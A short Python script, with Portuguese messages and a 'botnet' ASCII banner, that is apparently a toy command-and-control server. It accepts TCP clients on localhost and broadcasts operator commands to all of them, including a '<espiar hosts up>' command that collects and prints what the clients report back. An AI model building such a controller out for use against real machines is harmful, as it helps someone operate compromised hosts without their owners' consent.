# -*- coding: utf-8 -*-
from socket import *
import _thread
import random
import time

clients=[]
serverPort = 11600
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(('localhost',serverPort))
serverSocket.listen(1)
print("┌┐ ┌─┐┌┬┐┌┐┌┌─┐┌┬┐\n├┴┐│ │ │ │││├┤  │ \n└─┘└─┘ ┴ ┘└┘└─┘ ┴ ")
	
def task(connection, client):
	clients.append((connection,client))
	print("\nNova conexao em: ",client,"!")
	print("Digite uma mensagem broadcast:")
	
def broadcast():
	while True:
		msg=str(input("Digite uma mensagem broadcast: "))
		if(msg!=""):
			for i in range(len(clients)):
				try:
					conn=clients[i][0]
					conn.send(msg.encode())
					
					if msg=="<espiar hosts up>":
						received = conn.recv(1024)
						print (str(received).replace("b","").replace("'","")+"\n")
				except:
					pass
	
print ("O server esta pronto para enviar comandos!")
print ("Aguardando conexões...\n")
_thread.start_new_thread(broadcast, ())

while True:
		connection, addr = serverSocket.accept()
		_thread.start_new_thread(task, (connection, addr))
		time.sleep(5)